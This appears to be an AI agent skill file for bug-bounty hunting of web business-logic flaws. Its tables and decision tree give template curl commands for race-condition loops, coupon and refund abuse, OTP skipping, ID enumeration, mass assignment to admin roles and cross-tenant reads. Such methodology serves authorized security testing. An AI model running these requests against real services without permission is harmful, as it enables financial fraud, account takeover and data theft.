---
name: business-logic-hunter
description: "EXECUTION MATRIX for business logic bugs — highest bounty category. Each pattern has SIGNAL → TEST → CONFIRM → KILL + response-driven next actions + sibling analysis. No theory, just commands. Load after app-model built. NOT for OWASP vulns (use web2-vuln-classes)."
---

# BUSINESS LOGIC HUNTER — EXECUTION MATRIX + RESPONSE-DRIVEN

## EXECUTION MATRIX

| Pattern | Signal | Test | Confirm | Kill | Response-Driven Next Action |
|---------|--------|------|---------|------|---------------------------|
| **Subscription Abuse** | plan_id in JS/response | `curl -X POST /api/plan -d '{"plan_id":"enterprise_premium"}'` after trial expires | Premium features accessible post-expiry | 401/403 on feature endpoint | plan_id accepted → test trial reset via different account, test plan downgrade keeps features |
| **Race Condition** | Mutate balance/stock/claim | `for i in {1..30}; do curl -X POST /claim -d "code=WELCOME20" &; done; wait` | All 30 return 200 with discount applied | DB UNIQUE constraint violation | Race confirmed → verify BOTH changes persisted in ledger → financial impact chain |
| **Coupon/Discount** | coupon_code field | `curl -X POST /checkout -d '{"coupon":"WELCOME20","quantity":-1}'` | Negative quantity reduces total | Coupon one-time lock | Negative works → test stackable coupons, unlimited quantity → chain to free goods |
| **Wallet/Balance** | balance field in response | `curl -X POST /withdraw -d '{"amount":100}'` + `curl -X POST /withdraw -d '{"amount":100}'` | Both succeed, balance -200 | Atomic DB transaction | Race works → check ledger for double spend → test on transfer between users |
| **OTP Bypass** | OTP step in signup flow | Skip OTP step: `curl -X POST /signup -d '{"email":"x@x.com","password":"X","skip_otp":true}'` | Account created without verification | Server-side OTP check | OTP skip works → test changing email BEFORE OTP verification → ATO chain |
| **IDOR** | Sequential IDs in URL | `for i in {1..100}; do curl /api/order/$i -H "Cookie: SESSION=A"; done` | Other user's order data returned | 403 for all IDs | IDOR confirmed → test PUT/DELETE on same pattern, test nested IDs |
| **Role Escalation** | role/permission field | `curl -X PUT /api/team/member -d '{"user_id":TARGET,"role":"admin"}'` | Target is now admin | Server enforces role hierarchy | Role escalation works → test `is_admin`, `permissions[]`, `plan` fields |
| **Mass Assignment** | User model fields in API | `curl -X PATCH /api/profile -d '{"role":"admin","credits":9999}'` | Role/credits field updated | White-list validation | Mass assignment works → find ALL writable fields, test on other endpoints |
| **Workflow Bypass** | Multi-step flow | `curl -X POST /order/finalize -d '{"step":"payment"}'` after skipping step 2 | Order created without completing step 2 | State machine validation | Bypass works → test reordering steps, repeating steps, skipping to ANY step |
| **Refund Abuse** | refund_amount/order_id | `curl -X POST /refund -d '{"order_id":"X","amount":9999}'` | Refund > purchase amount approved | Server caps refund to paid | Refund > paid works → test same refund multiple times, test refund after cancellation |
| **Cross-Tenant** | org_id/workspace_id | `curl /api/workspace/OTHER_ID/invoices -H "Cookie: SESSION=A"` | Tenant A reads Tenant B invoices | Workspace boundary check | Cross-tenant works → test all endpoints with other org IDs, test invite acceptance from other org |

## SIBLING ENDPOINT DISCOVERY FOR BUSINESS LOGIC

| Signal Endpoint | Siblings to Check | What to Expect |
|----------------|-------------------|---------------|
| `/api/checkout` | `/api/checkout/apply-coupon`, `/api/checkout/shipping`, `/api/checkout/review` | Discount logic may be separate from payment, weaker validation |
| `/api/subscription` | `/api/subscription/cancel`, `/api/subscription/reactivate`, `/api/plan/change` | Cancel→reactivate may bypass payment check |
| `/api/wallet/withdraw` | `/api/wallet/transfer`, `/api/wallet/deposit`, `/api/wallet/balance` | Transfer may lack same validation as withdraw |
| `/api/orders/{id}/refund` | `/api/orders/{id}/cancel`, `/api/orders/{id}/return`, `/api/orders/{id}/invoice` | Cancel+refund race, partial refund abuse |
| `/api/team/invite` | `/api/team/member`, `/api/team/role`, `/api/workspace/{id}/member` | Invite→role escalation chain |
| `/api/user/email` | `/api/user/password`, `/api/user/profile`, `/api/user/delete` | Email change without verify → ATO chain |

## RESPONSE-DRIVEN FLOW

```
Found business logic surface?
├─ Response has `plan_id` / `trial` → Subscription abuse
│  └─ Confirmed → sibling: cancel→reactivate cycle, plan downgrade
├─ Balance/credits in response → Wallet race condition
│  └─ Confirmed → sibling: transfer endpoint, check ledger atomicity
├─ Coupon field accepted → Coupon abuse
│  └─ Confirmed → sibling: stackable coupons, negative quantity, expiry bypass
├─ Role/permission field → Mass assignment → Role escalation
│  └─ Confirmed → sibling: admin endpoints, user management APIs
├─ OTP/verification step visible → OTP bypass
│  └─ Confirmed → sibling: email change in same flow, password reset
├─ Multi-step checkout → Workflow bypass
│  └─ Confirmed → sibling: state machine endpoints, admin approval flows
├─ Refund/cancel buttons → Refund abuse
│  └─ Confirmed → sibling: partial refund, cancel+order new, race cancel
├─ Org/workspace IDs → Cross-tenant access
│  └─ Confirmed → sibling: ALL endpoints with org param, invite flow
├─ Sequential/guessable IDs → IDOR
│  └─ Confirmed → sibling: PUT/DELETE on same ID pattern, nested resources
└─ Unknown → Log all responses, compare diff user A vs B → find any diff
```

## TOOL CHAIN
```
Session A: curl -H "Cookie: SESSION_A" [endpoint]
Session B: curl -H "Cookie: SESSION_B" [endpoint]
Compare: diff <(curl_A) <(curl_B)
Race: for i in {1..N}; do curl ... &; done; wait
Fuzz IDs: for i in {1..N}; do curl /api/resource/$i; done
```

## FALSE POSITIVE KILLS
- 401/403 = auth present (move on)
- DB UNIQUE violation = no race
- Same data both sessions = no IDOR
- Coupon already redeemed = one-time lock
- "Cannot skip step" = state machine present

## PATTERN FILES

| Pattern | File |
|---------|------|
| IDOR Deep Dive | `reference/advanced-idor.md` |
| Chain Construction | `reference/chain-construction.md` |
| Coupon/Discount | `reference/coupon-discount-abuse.md` |
| Cross-Tenant | `reference/cross-tenant-access.md` |
| Email Change Abuse | `reference/email-change-abuse.md` |
| Flow Mapping | `reference/flow-mapping.md` |
| 5 Questions Framework | `reference/framework-5-questions.md` |
| Mass Assignment | `reference/mass-assignment.md` |
| Multi-Account Setup | `reference/multi-account-infrastructure.md` |
| OTP/MFA Bypass | `reference/otp-mfa-bypass.md` |
| Pattern Template | `reference/pattern-template.md` |
| Prerequisite Model | `reference/prerequisite-model.md` |
| Privilege Escalation | `reference/privilege-escalation.md` |
| Race Conditions | `reference/race-conditions.md` |
| Refund Abuse | `reference/refund-abuse.md` |
| Subscription Abuse | `reference/subscription-abuse.md` |
| Tooling | `reference/tooling.md` |
| Verification | `reference/verification.md` |
| Wallet Manipulation | `reference/wallet-balance-manipulation.md` |
| Workflow Bypass | `reference/workflow-bypass.md` |
